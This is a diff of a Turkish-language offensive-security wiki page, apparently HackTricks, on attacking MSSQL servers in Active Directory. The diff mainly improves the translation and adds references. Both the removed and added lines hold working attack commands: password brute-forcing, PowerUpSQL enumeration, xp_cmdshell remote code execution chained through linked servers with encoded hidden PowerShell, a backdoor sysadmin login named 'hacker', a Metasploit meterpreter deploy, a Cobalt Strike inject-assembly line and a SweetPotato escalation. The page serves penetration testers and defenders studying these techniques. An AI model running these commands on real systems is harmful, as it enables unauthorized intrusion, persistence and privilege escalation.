@@ -7,7 +7,7 @@
 
 ### Python
 
-[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) aracı impacket tabanlıdır; ayrıca kerberos tickets kullanarak authenticate olmayı ve link chains üzerinden attack gerçekleştirmeyi sağlar.
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) aracı Impacket temel alınarak geliştirilmiştir. Kerberos ticket'larıyla authentication'ı ve linked-server chain'leri üzerinden gerçekleştirilen saldırıları destekler.<sup>[[1]](#references)</sup>
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,28 +79,28 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### Domain oturumu olmadan ağ üzerinden enumeration
+### Domain session olmadan ağ üzerinden Enumeration
 ```
 
 # Interactive mode
 
 mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 
-````
+```
 ---
-###  Powershell
+### PowerShell
 
-Powershell modülü [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) bu durumda oldukça kullanışlıdır.
+[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) PowerShell module, SQL Server ortamları için keşif, denetim ve exploitation işlevleri sağlar.<sup>[[2]](#references)</sup>
 ```bash
 Import-Module .\PowerupSQL.psd1
-````
-### Domain oturumu olmadan ağ üzerinden enumeration
+```
+### Domain oturumu olmadan ağ üzerinden numaralandırma
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
 
-#If you don't have a AD account, you can try to find MSSQL scanning via UDP
+#If you don't have an AD account, you can try to find MSSQL instances by scanning via UDP
 #First, you will need a list of hosts to scan
 Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads 10
 
@@ -108,7 +108,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
-### Domain içinden Enumeration
+### Etki Alanının İçinden Enumeration
 ```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -127,10 +127,10 @@ Get-SQLServerDefaultLoginPw
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
 
-#Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
+#Try to connect and obtain info from each MSSQL server (also useful to check connectivity)
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 
-# Get DBs, test connections and get info in oneliner
+# Get DBs, test connections and get info in one line
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
 ## MSSQL Basic Abuse
@@ -146,13 +146,13 @@ Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
 # List columns in a table
 Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
 
-# Get some sample data from a column in a table (columns username & passwor din the example)
-Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+# Get some sample data from a column in a table (columns username & password in the example)
+Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
 
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lot of CVSs generated in current dir)
+#Dump an instance (a lot of CSVs are generated in the current directory)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -161,14 +161,14 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-MSSQL hostu içinde **komutlar çalıştırmak** da mümkün olabilir
+`xp_cmdshell` aracılığıyla MSSQL host'unda **komutlar çalıştırmak** da mümkün olabilir.<sup>[[5]](#references)</sup>
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the **aşağıdaki bölümde bunu manuel olarak nasıl yapacağınızı** açıklayan sayfaya bakın.
+Aşağıdaki **bölümde bunun manuel olarak nasıl yapılacağını** kontrol edin.
 
-### MSSQL Basic Hacking Tricks
+### MSSQL Temel Hacking Teknikleri
 
 
 {{#ref}}
@@ -177,14 +177,14 @@ Check in the **aşağıdaki bölümde bunu manuel olarak nasıl yapacağınızı
 
 ## MSSQL Trusted Links
 
-Bir MSSQL instance'ı farklı bir MSSQL instance'ı tarafından trusted (database link) durumundaysa ve kullanıcının trusted database üzerinde yetkileri varsa, **trust relationship'ı kullanarak diğer instance üzerinde de query çalıştırabilir**. Bu trust ilişkileri birbirine zincirlenebilir ve bir noktada kullanıcı, command çalıştırabileceği yanlış yapılandırılmış bir database bulabilir.
+Bir MSSQL instance'ı linked-server yapılandırması üzerinden başka bir instance'a güveniyorsa, yeterli izinlere sahip bir kullanıcı **diğer instance üzerinde query çalıştırmak için bu trust relationship'i kullanabilir**. Bu links zincirleme şekilde kullanılabilir ve potansiyel olarak kullanıcının command çalıştırabildiği yanlış yapılandırılmış bir sunucuya ulaşılabilir.<sup>[[3]](#references)</sup>
 
-**Database'ler arasındaki link'ler forest trust'ları üzerinden de çalışır.**
+**Databases arasındaki links, forest trusts genelinde de çalışır.**
 
-### Powershell Abuse
+### PowerShell Abuse
 ```bash
-#Look for MSSQL links of an accessible instance
-Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
+#Look for MSSQL links from an accessible instance
+Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkId > 0
 
 #Crawl trusted links, starting from the given one (the user being used by the MSSQL instance is also specified)
 Get-SQLServerLinkCrawl -Instance mssql-srv.domain.local -Verbose
@@ -204,7 +204,7 @@ Invoke-SQLAudit -Verbose -Instance "dcorp-mssql.dollarcorp.moneycorp.local"
 #Try to escalate privileges on an instance
 Invoke-SQLEscalatePriv –Verbose –Instance "SQLServer1\Instance1"
 
-#Manual trusted link queery
+#Manual trusted-link query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
 ## Enable xp_cmdshell and check it
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'SELECT * FROM OPENQUERY("sql2.domain.io", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''');'
@@ -213,7 +213,7 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-Kullanılabilecek bir diğer benzer araç [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+Kullanılabilecek başka bir tool ise [**SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):<sup>[[6]](#references)</sup>
 ```bash
 SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
 # Cobalt Strike
@@ -221,43 +221,43 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-Metasploit kullanarak güvenilir bağlantıları kolayca kontrol edebilirsiniz.
+Güvenilir bağlantıları Metasploit kullanarak kolayca kontrol edebilirsiniz.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Metasploit'in MSSQL'de yalnızca `openquery()` işlevini abuse etmeye çalışacağını unutmayın (bu nedenle `openquery()` ile command execute edemiyorsanız, command execute etmek için **EXECUTE** yöntemini manuel olarak denemeniz gerekir; aşağıya bakın.)
+Metasploit yalnızca `OPENQUERY()` işlevini abuse etmeye çalışır. `OPENQUERY()` üzerinden command execution başarısız olursa, aşağıda açıklandığı şekilde **EXECUTE** yöntemini **manuel olarak** deneyin.<sup>[[4]](#references)</sup>
 
-### Manual - Openquery()
+### Manuel - Openquery()
 
-**Linux** üzerinden **sqsh** ve **mssqlclient.py** ile MSSQL console shell elde edebilirsiniz.
+**Linux** üzerinden **sqsh** ve **mssqlclient.py** ile bir MSSQL console shell elde edebilirsiniz.
 
-**Windows** üzerinden de linkleri bulabilir ve [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL client** kullanarak command'leri manuel olarak execute edebilirsiniz.
+**Windows** üzerinden, bağlantıları bulabilir ve [**HeidiSQL**](https://www.heidisql.com) gibi bir **MSSQL client** kullanarak komutları manuel olarak çalıştırabilirsiniz.<sup>[[7]](#references)</sup>
 
-_Windows authentication kullanarak login olma:_
+_Windows authentication kullanarak login olun:_
 
-![Metasploit - Manual - Openquery(): Windows authentication kullanarak login olma](<../../images/image (808).png>)
+![Metasploit - Manuel - Openquery(): Windows authentication kullanarak login olma](<../../images/image (808).png>)
 
-#### Güvenilir Linkleri Bul
+#### Güvenilir Bağlantıları Bulun
 ```sql
 select * from master..sysservers;
 EXEC sp_linkedservers;
 ```
-![Manual - Openquery() - Güvenilir Link'leri Bulma: EXEC sp linkedservers;](<../../images/image (716).png>)
+![Manual - Openquery() - Find Trustable Links: EXEC sp linkedservers;](<../../images/image (716).png>)
 
-#### Güvenilir link üzerinden sorgu çalıştırma
+#### Güvenilir bağlantıda sorguları çalıştırma
 
-Link üzerinden sorgular çalıştırın (örneğin: yeni erişilebilir instance'ta daha fazla link bulun):
+Bağlantı üzerinden sorguları çalıştırın (örneğin: yeni erişilebilir instance'da daha fazla bağlantı bulun):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> Çift ve tek tırnakların nerede kullanıldığını kontrol edin; bunları doğru şekilde kullanmak önemlidir.
+> Çift ve tek tırnakların nerelerde kullanıldığına dikkat edin; bunları doğru şekilde kullanmak önemlidir.
 
-![Güvenilir Bağlantıları Bul - Güvenilir bağlantıda sorguları çalıştırın: Çift ve tek tırnakların nerede kullanıldığını kontrol edin; bunları doğru şekilde kullanmak önemlidir](<../../images/image (643).png>)
+![Güvenilir Bağlantıları Bulma - Güvenilir bağlantıda sorguları çalıştırın: Çift ve tek tırnakların nerelerde kullanıldığına dikkat edin; bunları doğru şekilde kullanmak önemlidir](<../../images/image (643).png>)
 
-Bu güvenilir bağlantılar zincirini manuel olarak sonsuza kadar sürdürebilirsiniz.
+Bu güvenilir bağlantı zincirlerini manuel olarak taramaya devam edebilirsiniz.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -265,31 +265,41 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
-`openquery()` üzerinden `exec xp_cmdshell` gibi işlemleri gerçekleştiremiyorsanız `EXECUTE` methodunu deneyin.
+`OPENQUERY()` üzerinden `exec xp_cmdshell` gibi eylemleri gerçekleştiremiyorsanız, `EXECUTE` yöntemini deneyin.
 
-### Manual - EXECUTE
+### Manuel - EXECUTE
 
-Trusted link'leri `EXECUTE` kullanarak da abuse edebilirsiniz:
+trusted link'leri `EXECUTE` kullanarak da abuse edebilirsiniz:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
-## Yerel Privilege Escalation
+## Local Privilege Escalation
 
-**MSSQL local user** genellikle **`SeImpersonatePrivilege`** adı verilen özel bir privilege türüne sahiptir. Bu, hesabın "kimlik doğrulamasından sonra bir istemciyi taklit etmesine" olanak tanır.
+**MSSQL service account** çoğunlukla hesabın kimlik doğrulamasından sonra bir istemciyi taklit etmesine olanak tanıyan **`SeImpersonatePrivilege`** user right'a sahiptir.
 
-Birçok yazarın geliştirdiği stratejilerden biri, SYSTEM service'ini saldırganın oluşturduğu rogue veya man-in-the-middle service'ine authentication yapmaya zorlamaktır. Bu rogue service, SYSTEM service authentication yapmaya çalışırken onu taklit edebilir.
+Birçok yazarın geliştirdiği stratejilerden biri, bir SYSTEM service'ini saldırganın oluşturduğu rogue veya man-in-the-middle service'e authenticate olmaya zorlamaktır. Bu rogue service, SYSTEM service authenticate olmaya çalışırken onu impersonate edebilir.
 
-[SweetPotato](https://github.com/CCob/SweetPotato), Beacon'ın `execute-assembly` command'i aracılığıyla çalıştırılabilen bu çeşitli tekniklerin bir koleksiyonunu içerir.
+[SweetPotato](https://github.com/CCob/SweetPotato) bu tekniklerden birkaçını bir araya getirir ve Beacon'ın `execute-assembly` command'i üzerinden çalıştırılabilir.<sup>[[8]](#references)</sup>
 
 
 
 ### SCCM Management Point NTLM Relay (OSD Secret Extraction)
-SCCM **Management Points** için varsayılan SQL rollerinin, Network Access Account ve Task-Sequence secrets bilgilerini doğrudan site database'inden dump etmek için nasıl abuse edilebileceğini görün:
+SCCM **Management Points** için varsayılan SQL rollerinin, Network Access Account ve Task-Sequence secrets değerlerini doğrudan site database'inden dump etmek amacıyla nasıl abuse edilebileceğini görün:
 
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
 
+## References
+
+- [1] [ScorpionesLabs – MSSqlPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+- [2] [NetSPI – PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
+- [3] [Microsoft Learn – Linked servers (Database Engine)](https://learn.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine?view=sql-server-ver17)
+- [4] [Microsoft Learn – OPENQUERY](https://learn.microsoft.com/en-us/sql/t-sql/functions/openquery-transact-sql?view=sql-server-ver17)
+- [5] [Microsoft Learn – xp_cmdshell server configuration option](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver17)
+- [6] [lefayjey – SharpSQLPwn](https://github.com/lefayjey/SharpSQLPwn)
+- [7] [HeidiSQL](https://www.heidisql.com)
+- [8] [CCob – SweetPotato](https://github.com/CCob/SweetPotato)
 {{#include ../../banners/hacktricks-training.md}}
